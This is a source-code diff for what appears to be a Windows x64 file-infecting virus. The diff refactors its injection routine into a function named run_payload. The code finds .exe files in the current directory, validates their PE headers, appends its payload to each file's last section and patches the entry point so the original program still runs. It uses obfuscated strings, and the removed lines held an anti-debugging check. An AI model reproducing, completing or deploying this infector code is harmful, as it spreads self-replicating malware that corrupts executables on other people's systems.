@@ -4,28 +4,7 @@
 #include "libproc.hpp"
 #include "utils.h"
 
-EXTERN_C_START
-extern CONST BYTE __payload_start;
-extern CONST VOID payload();
-extern CONST DWORD code_size;
-extern CONST LONGLONG delta_start;
-#ifndef SKIP_SIGN
-extern CONST DWORD signature;
-#endif  // SKIP_SIGN
-EXTERN_C_END
-
-INJECTED_CODE VOID inj_code_c() {
-#ifndef NO_ANTIDBG
-    if (being_debugged()) {
-        // __debugbreak();
-        // __fastfail(FAST_FAIL_FATAL_APP_EXIT);
-        // ((PVOID(*)())NULL)();
-
-        // If we're being debugged, do not run the payload, just run the original program normally
-        return;
-    }
-#endif  // NO_ANTIDBG
-
+INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pPayloadData) {
     // Declare obfuscated strings for the rest of the function
     DECLARE_OBFUSCATED(user32, "USER32.DLL");              // DLL to load for MessageBoxA
     DECLARE_OBFUSCATED(mbTitle, "Yharnam");                // MessageBoxA title
@@ -34,38 +13,37 @@ INJECTED_CODE VOID inj_code_c() {
 
 #ifdef PL_DEBUG
     // Declarations for debug strings
-    CONST CHAR sNewline[1] = {'\n'};
+    CONST CHAR sNewline[] = {'\n'};
 
     INJECTED_VAR static CONST CHAR mbDbgTitle[] = "Debug";
     INJECTED_VAR static CONST CHAR msgSeparator[] = "====================";
     INJECTED_VAR static CONST CHAR msgModuleName[] = "Current module name: ";
     INJECTED_VAR static CONST CHAR msgInjecting[] = "Injecting: ";
     INJECTED_VAR static CONST CHAR msgSkipping[] = "Skipping file: ";
-    INJECTED_VAR static CONST CHAR errGetModName[] = "Error getting module name";
-    INJECTED_VAR static CONST CHAR errGetDir[] = "Error getting current directory";
-    INJECTED_VAR static CONST CHAR errFindFile[] = "No .exe files";
-    INJECTED_VAR static CONST CHAR errOpenFile[] = "Error opening file";
-    INJECTED_VAR static CONST CHAR errMapFile[] = "Error mapping file";
-    INJECTED_VAR static CONST CHAR errNotPE[] = "Not a PE x64 file";
-    INJECTED_VAR static CONST CHAR errAlreadyInjected[] = "Payload already injected";
+    INJECTED_VAR static CONST CHAR errGetModName[] = "[!] Error getting module name";
+    INJECTED_VAR static CONST CHAR errGetDir[] = "[!] Error getting current directory";
+    INJECTED_VAR static CONST CHAR errFindFile[] = "[*] No .exe files";
+    INJECTED_VAR static CONST CHAR errOpenFile[] = "[!] Error opening file";
+    INJECTED_VAR static CONST CHAR errMapFile[] = "[!] Error mapping file";
+    INJECTED_VAR static CONST CHAR errNotPE[] = "> Not a PE x64 file";
+    INJECTED_VAR static CONST CHAR errAlreadyInjected[] = "> Payload already injected";
 #endif  // PL_DEBUG
 
     // Get module handles and function pointers
     /* */
-    CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
-    CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);
-    CONST auto pGetModuleFileNameA = GET_FUNC(pKernel32Dll, GetModuleFileNameA);
-    CONST auto pCreateFileA = GET_FUNC(pKernel32Dll, CreateFileA);
-    CONST auto pGetFileSize = GET_FUNC(pKernel32Dll, GetFileSize);
-    CONST auto pCreateFileMappingA = GET_FUNC(pKernel32Dll, CreateFileMappingA);
-    CONST auto pMapViewOfFile = GET_FUNC(pKernel32Dll, MapViewOfFile);
-    CONST auto pFlushViewOfFile = GET_FUNC(pKernel32Dll, FlushViewOfFile);
-    CONST auto pUnmapViewOfFile = GET_FUNC(pKernel32Dll, UnmapViewOfFile);
-    CONST auto pCloseHandle = GET_FUNC(pKernel32Dll, CloseHandle);
-    CONST auto pGetCurrentDirectoryA = GET_FUNC(pKernel32Dll, GetCurrentDirectoryA);
-    CONST auto pFindFirstFileA = GET_FUNC(pKernel32Dll, FindFirstFileA);
-    CONST auto pFindNextFileA = GET_FUNC(pKernel32Dll, FindNextFileA);
-    CONST auto pFindClose = GET_FUNC(pKernel32Dll, FindClose);
+    CONST auto pLoadLibraryA = GET_FUNC(hKernel32Dll, LoadLibraryA);
+    CONST auto pGetModuleFileNameA = GET_FUNC(hKernel32Dll, GetModuleFileNameA);
+    CONST auto pCreateFileA = GET_FUNC(hKernel32Dll, CreateFileA);
+    CONST auto pGetFileSize = GET_FUNC(hKernel32Dll, GetFileSize);
+    CONST auto pCreateFileMappingA = GET_FUNC(hKernel32Dll, CreateFileMappingA);
+    CONST auto pMapViewOfFile = GET_FUNC(hKernel32Dll, MapViewOfFile);
+    CONST auto pFlushViewOfFile = GET_FUNC(hKernel32Dll, FlushViewOfFile);
+    CONST auto pUnmapViewOfFile = GET_FUNC(hKernel32Dll, UnmapViewOfFile);
+    CONST auto pCloseHandle = GET_FUNC(hKernel32Dll, CloseHandle);
+    CONST auto pGetCurrentDirectoryA = GET_FUNC(hKernel32Dll, GetCurrentDirectoryA);
+    CONST auto pFindFirstFileA = GET_FUNC(hKernel32Dll, FindFirstFileA);
+    CONST auto pFindNextFileA = GET_FUNC(hKernel32Dll, FindNextFileA);
+    CONST auto pFindClose = GET_FUNC(hKernel32Dll, FindClose);
 
     CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
     CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
@@ -74,8 +52,8 @@ INJECTED_CODE VOID inj_code_c() {
 #ifdef PL_DEBUG
     // Variables and functions for debug output
     BOOL bUseMsgbox = FALSE;  // Whether to use MessageBoxA for debug, if no console is available
-    CONST auto pGetStdHandle = GET_FUNC(pKernel32Dll, GetStdHandle);
-    CONST auto pWriteConsoleA = GET_FUNC(pKernel32Dll, WriteConsoleA);
+    CONST auto pGetStdHandle = GET_FUNC(hKernel32Dll, GetStdHandle);
+    CONST auto pWriteConsoleA = GET_FUNC(hKernel32Dll, WriteConsoleA);
     HANDLE hStderr = pGetStdHandle(STD_ERROR_HANDLE);
     if (!hStderr || hStderr == INVALID_HANDLE_VALUE) {
         bUseMsgbox = TRUE;
@@ -85,17 +63,20 @@ INJECTED_CODE VOID inj_code_c() {
     do {                                                                       \
         if (allowMb && bUseMsgbox) {                                           \
             pMessageBoxA(NULL, text, mbDbgTitle, MB_OK | MB_ICONINFORMATION);  \
-        } else {                                                               \
+        }                                                                      \
+        else {                                                                 \
             pWriteConsoleA(hStderr, text, (DWORD)my_strlen(text), NULL, NULL); \
         }                                                                      \
-    } while (0)
+    }                                                                          \
+    while (0)
 
 #define PRINT_DBG_NL()                                        \
     do {                                                      \
         if (!bUseMsgbox) {                                    \
             pWriteConsoleA(hStderr, sNewline, 1, NULL, NULL); \
         }                                                     \
-    } while (0)
+    }                                                         \
+    while (0)
 
 #else  // PL_DEBUG
 
@@ -154,7 +135,7 @@ INJECTED_CODE VOID inj_code_c() {
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     DWORD dwLastSectionPtr, dwLastSectionSize, dwLastSectionRva, dwLastSectionEnd, dwOrigEntryPoint;
     WORD wNbSectionsMin1;  // Number of sections minus 1 (for array indexing)
-    PBYTE pPayloadData;
+    PBYTE pPayloadDest;
 
     do {
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -168,7 +149,8 @@ INJECTED_CODE VOID inj_code_c() {
 #ifdef NEED_BANG
             || sDirEnd[0] != '!'  // Skip file names not starting with '!' if `NEED_BANG` is defined
 #endif                            // NEED_BANG
-        ) {
+        )
+        {
             PRINT_DBG(msgSkipping);
             PRINT_DBG(sFilePath);
             PRINT_DBG_NL();
@@ -213,7 +195,8 @@ INJECTED_CODE VOID inj_code_c() {
         pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
         if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
             pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
-            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+        {
             goto invalid_pe;
         }
 
@@ -275,7 +258,7 @@ INJECTED_CODE VOID inj_code_c() {
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
         pLastSection = &pSection[wNbSectionsMin1];
-        pPayloadData = (PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize;
+        pPayloadDest = (PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize;
 
         pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
         pLastSection->SizeOfRawData += dwSizeAligned;
@@ -295,8 +278,8 @@ INJECTED_CODE VOID inj_code_c() {
             dwLastSectionEnd + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
 
         // Inject the payload and update the entry point delta
-        my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
-        *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
+        my_memcpy(pPayloadDest, pPayloadData, code_size);
+        *(PLONGLONG)(pPayloadDest + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
             (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
 
         pFlushViewOfFile(pMapAddress, 0);
@@ -311,7 +294,8 @@ INJECTED_CODE VOID inj_code_c() {
         pCloseHandle(hMapFile);
     close_file:
         pCloseHandle(hFile);
-    } while (pFindNextFileA(hFind, &findData));
+    }
+    while (pFindNextFileA(hFind, &findData));
 
     pFindClose(hFind);
 
